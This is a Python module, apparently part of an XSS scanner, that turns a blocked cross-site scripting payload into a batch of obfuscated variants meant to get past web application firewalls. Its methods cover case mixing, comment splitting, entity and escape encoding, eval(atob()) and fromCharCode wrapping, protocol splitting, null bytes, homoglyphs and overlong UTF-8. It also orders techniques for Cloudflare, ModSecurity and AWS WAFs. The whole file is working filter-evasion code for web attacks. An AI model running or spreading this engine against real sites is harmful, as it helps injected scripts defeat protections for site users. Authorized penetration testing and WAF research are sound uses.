import base64
import random
import re
import urllib.parse
from typing import List, Callable

from . import config

# Vocabulary used by the case / comment / whitespace mutators.
# HTML tag names and event-handler attribute names are case-insensitive in the
# browser, so we may mix their case freely WITHOUT breaking execution.
TAG_KEYWORDS = [
    "script", "iframe", "svg", "img", "math", "marquee", "details",
    "video", "audio", "object", "embed", "body", "template", "noscript",
]
EVENT_KEYWORDS = [
    "onerror", "onload", "onclick", "onmouseover", "onmouseout",
    "onmouseenter", "onfocus", "onblur", "onchange", "onsubmit",
    "ontoggle", "onbegin", "onstart", "oncanplay", "onanimationstart",
]
SCHEME_KEYWORDS = ["javascript", "data", "vbscript"]
# JS identifiers must stay byte-exact (JS is case-sensitive), so these are
# obfuscated with hex/unicode escapes and HTML entities instead of case.
FUNC_KEYWORDS = ["alert", "prompt", "confirm", "eval", "document.write", "console.log"]


class WAFBypass:
    """WAF-agnostic XSS payload mutation engine.

    Given a payload that a web application firewall blocked, generate a batch
    of obfuscated variants using generic encoding / whitespace / comment /
    case / entity techniques. No WAF fingerprinting required -- just throw a
    diverse batch of mutations and let the ones that slip through the
    signature filter reach the application.
    """

    def __init__(self):
        # Legacy single-technique list (kept for apply_all / backward compat).
        self.bypass_techniques = [
            self._case_variation,
            self._comment_injection,
            self._hex_escape,
            self._unicode_escape,
            self._html_entity,
            self._double_url_encode,
            self._tab_newline_injection,
            self._null_byte,
            self._unicode_case,
            self._mixed_encoding,
            self._utf8_overlong,
            self._nested_encoding,
        ]

    # ------------------------------------------------------------------
    # public API
    # ------------------------------------------------------------------

    def apply_all(self, payload: str) -> List[str]:
        """Legacy: apply each single technique once (unlayered)."""
        variants = []
        for technique in self.bypass_techniques:
            try:
                result = technique(payload)
                if result and result != payload:
                    variants.append(result)
            except Exception:
                pass
        return variants

    def generate_evasive_variants(self, payload: str, limit: int = 12) -> List[str]:
        """Generate a diverse, bounded batch of obfuscated variants.

        Ordered roughly by generic survivability against signature-based WAFs,
        then layered combos (two techniques at once) for stricter filters.
        """
        variants: List[str] = []
        seen = set()

        def add(p: str):
            if not p or p == payload or p in seen:
                return
            seen.add(p)
            variants.append(p)

        # Single-pass mutations
        add(self._case_variation(payload))            # <ScRiPt>alert(1)</ScRiPt>
        add(self._keyword_entity(payload))            # onerror=&#97;&#108;&#101;&#114;&#116;(1)
        add(self._keyword_unicode(payload))           # onerror=al\u0065rt(1)
        add(self._keyword_hex(payload))               # onerror=\x61lert(1)
        add(self._base64_wrap(payload))               # eval(atob('YWxlcnQoMSk='))
        add(self._from_char_code(payload))            # eval(String.fromCharCode(97,108,...))
        add(self._comment_injection(payload))         # <scr<!-- -->ipt>
        add(self._whitespace_injection(payload))      # src=x\t onerror=...
        add(self._protocol_split(payload))            # java\nscript:
        add(self._protocol_tab(payload))              # java\tscript:
        add(self._attr_break_entities(payload))       # &#34;&#62;<svg onload=...
        add(self._tab_newline_injection(payload))     # onerror\t...
        add(self._null_byte(payload))                 # onerror%00=
        add(self._mixed_encoding(payload))            # &#97;&#108;&#101;&#114;&#116;(1)
        add(self._html_entity(payload))               # &#60;script&#62;...
        add(self._unicode_case(payload))              # homoglyphs
        add(self._double_url_encode(payload))         # %253Cscript...
        add(self._nested_encoding(payload))
        add(self._utf8_overlong(payload))             # %C0%BC

        # Layered combos (second technique applied on top of the first)
        add(self._random_case(payload))
        add(self._comment_injection(self._case_variation(payload)))
        add(self._keyword_entity(self._case_variation(payload)))
        add(self._keyword_unicode(self._case_variation(payload)))
        add(self._random_case(self._comment_injection(payload)))
        add(self._whitespace_injection(self._case_variation(payload)))
        add(self._base64_wrap(self._case_variation(payload)))
        add(self._keyword_entity(self._comment_injection(payload)))
        add(self._protocol_split(self._case_variation(payload)))
        add(self._attr_break_entities(self._case_variation(payload)))
        add(self._tab_newline_injection(self._keyword_unicode(payload)))
        add(self._null_byte(self._case_variation(payload)))

        return variants[:limit]

    # ------------------------------------------------------------------
    # generic helpers
    # ------------------------------------------------------------------

    def _mix_case(self, word: str) -> str:
        return "".join(c.upper() if random.random() < 0.5 else c for c in word)

    def _case_variation(self, p: str) -> str:
        out = p
        for kw in TAG_KEYWORDS + EVENT_KEYWORDS:
            out = re.sub(re.escape(kw), self._mix_case(kw), out, flags=re.IGNORECASE)
        return out

    def _random_case(self, p: str) -> str:
        """Random per-char case on HTML vocab; JS function names untouched."""
        out = p
        for kw in TAG_KEYWORDS + EVENT_KEYWORDS:
            out = re.sub(re.escape(kw), self._mix_case(kw), out, flags=re.IGNORECASE)
        return out

    def _comment_injection(self, p: str) -> str:
        if "<script>" in p:
            return p.replace("<script>", "<scr<!-- -->ipt>")
        if "</script>" in p:
            return p.replace("</script>", "</scr<!-- -->ipt>")
        if "onerror" in p:
            s = p.replace("onerror", "on/**/error")
            if s != p:
                return s
        if "onload" in p:
            s = p.replace("onload", "on/**/load")
            if s != p:
                return s
        return p

    def _keyword_entity(self, p: str) -> str:
        """Entity-encode a JS keyword: decodes in script body / attr values."""
        for kw in FUNC_KEYWORDS + SCHEME_KEYWORDS:
            if kw in p:
                repl = "".join(f"&#{ord(c)};" for c in kw)
                return p.replace(kw, repl)
        return p

    def _keyword_unicode(self, p: str) -> str:
        """JS identifier unicode escape: al\\u0065rt == alert in JS."""
        for kw in FUNC_KEYWORDS:
            if kw in p:
                repl = "".join(f"\\u{ord(c):04x}" for c in kw)
                return p.replace(kw, repl)
        return p

    def _keyword_hex(self, p: str) -> str:
        """JS hex escape: \\x61lert == alert in JS."""
        for kw in FUNC_KEYWORDS:
            if kw in p:
                repl = "".join(f"\\x{ord(c):02x}" for c in kw)
                return p.replace(kw, repl)
        return p

    def _hex_escape(self, p: str) -> str:
        return self._keyword_hex(p)

    def _unicode_escape(self, p: str) -> str:
        return self._keyword_unicode(p)

    def _base64_wrap(self, p: str) -> str:
        m = re.search(r"((?:alert|confirm|prompt|console\.log)\s*\(\s*[^)]{0,60}\s*\))", p, re.IGNORECASE)
        if not m:
            return p
        call = m.group(1).strip()
        try:
            b64 = base64.b64encode(call.encode()).decode()
        except Exception:
            return p
        quote = '"' if "'" in p else "'"
        return p[:m.start(1)] + f"eval(atob({quote}{b64}{quote}))" + p[m.end(1):]

    def _from_char_code(self, p: str) -> str:
        m = re.search(r"((?:alert|confirm|prompt|console\.log)\s*\(\s*[^)]{0,60}\s*\))", p, re.IGNORECASE)
        if not m:
            return p
        call = m.group(1).strip()
        codes = ",".join(str(ord(c)) for c in call)
        return p[:m.start(1)] + f"eval(String.fromCharCode({codes}))" + p[m.end(1):]

    def _html_entity(self, p: str) -> str:
        if "<" in p or ">" in p:
            return p.replace("<", "&#60;").replace(">", "&#62;")
        return p

    def _double_url_encode(self, p: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(p, safe=''), safe='')

    def _tab_newline_injection(self, p: str) -> str:
        result = p
        result = re.sub(r'(\bon\w+)=', r'\1\t=', result)
        return result if result != p else p

    def _whitespace_injection(self, p: str) -> str:
        """Tab before an event attribute: <img src=x\t onerror=alert(1)>"""
        if " on" in p:
            return p.replace(" on", "\t on", 1)
        return p

    def _protocol_split(self, p: str) -> str:
        if "javascript:" in p.lower():
            return re.sub(r"(?i)javascript", "java\nscript", p, count=1)
        if "data:" in p.lower():
            return re.sub(r"(?i)data", "da\nta", p, count=1)
        return p

    def _protocol_tab(self, p: str) -> str:
        if "javascript:" in p.lower():
            return re.sub(r"(?i)javascript", "java\tscript", p, count=1)
        return p

    def _attr_break_entities(self, p: str) -> str:
        """Encode the leading attribute-breakout chars: \" and > stay executable."""
        if "\"><" in p:
            return p.replace("\"><", "&#34;&#62;<", 1)
        if "'>" in p:
            return p.replace("'>", "&#39;&#62;<", 1)
        if "\">" in p:
            return p.replace("\">", "&#34;&#62;", 1)
        return p

    def _null_byte(self, p: str) -> str:
        if "onerror" in p:
            return p.replace("onerror=", "onerror%00=")
        if "onload" in p:
            return p.replace("onload=", "onload%00=")
        if "onfocus" in p:
            return p.replace("onfocus=", "onfocus%00=")
        return p

    def _unicode_case(self, p: str) -> str:
        mapping = {
            's': '\u017f', 'S': '\u017f',
            'c': '\u0107', 'C': '\u0106',
            'r': '\u0155', 'R': '\u0154',
            'i': '\u0131', 'I': '\u0130',
            'p': '\u1e55', 'P': '\u1e54',
            't': '\u0163', 'T': '\u0162',
        }
        result = list(p)
        for i, ch in enumerate(result):
            if ch in mapping and random.random() < 0.3:
                result[i] = mapping[ch]
        return ''.join(result)

    def _mixed_encoding(self, p: str) -> str:
        if "alert(" in p:
            return p.replace("alert(", "&#97;&#108;&#101;&#114;&#116;(")
        if "confirm(" in p:
            return p.replace("confirm(", "&#99;&#111;&#110;&#102;&#105;&#114;&#109;(")
        if "prompt(" in p:
            return p.replace("prompt(", "&#112;&#114;&#111;&#109;&#112;&#116;(")
        return p

    def _utf8_overlong(self, p: str) -> str:
        overlong = {
            '<': '%C0%BC',
            '>': '%C0%BE',
            '"': '%C0%A2',
            "'": '%C0%A7',
        }
        for orig, rep in overlong.items():
            if orig in p:
                result = p.replace(orig, rep, 1)
                if result != p:
                    return result
        return p

    def _nested_encoding(self, p: str) -> str:
        return urllib.parse.quote(p.replace("<", "%3C").replace(">", "%3E"))

    # ------------------------------------------------------------------
    # detection / strategies (legacy)
    # ------------------------------------------------------------------

    def detect_bypass_techniques(self, payload: str, response_text: str) -> List[str]:
        bypasses = []
        if any(c.isupper() for c in payload) and re.search(re.escape(payload), response_text, re.IGNORECASE):
            bypasses.append("case_variation")
        if "%2F" in payload or "&#" in payload or "\\u" in payload or "\\x" in payload:
            bypasses.append("encoding")
        if "%00" in payload:
            bypasses.append("null_byte")
        if any(ws in payload for ws in ["\n", "\r", "\t", "&#9;", "&#10;", "&#13;"]):
            bypasses.append("whitespace")
        if "<!--" in payload or "-->" in payload or "/**/" in payload:
            bypasses.append("comment_injection")
        if "%C0" in payload or "%C1" in payload:
            bypasses.append("utf8_overlong")
        if "%253C" in payload or "%253E" in payload:
            bypasses.append("double_url_encode")
        return bypasses


def select_bypass_strategy(waf_names: List[str]) -> List[Callable]:
    """Kept for API compatibility. The modern engine is WAF-agnostic and does
    not need to know which WAF it is facing."""
    bw = WAFBypass()
    techniques = bw.bypass_techniques
    # Prefer techniques historically effective per named WAF when known.
    ordered = list(techniques)
    if any("Cloudflare" in w for w in waf_names):
        ordered = [bw._comment_injection, bw._unicode_escape, bw._tab_newline_injection] + ordered
    elif any("ModSecurity" in w for w in waf_names):
        ordered = [bw._null_byte, bw._case_variation, bw._hex_escape] + ordered
    elif any("AWS" in w for w in waf_names):
        ordered = [bw._double_url_encode, bw._mixed_encoding, bw._nested_encoding] + ordered

    def make_runner(fn):
        def run(payload: str) -> List[str]:
            try:
                res = fn(payload)
                return [res] if res and res != payload else []
            except Exception:
                return []
        return run

    return [make_runner(fn) for fn in ordered]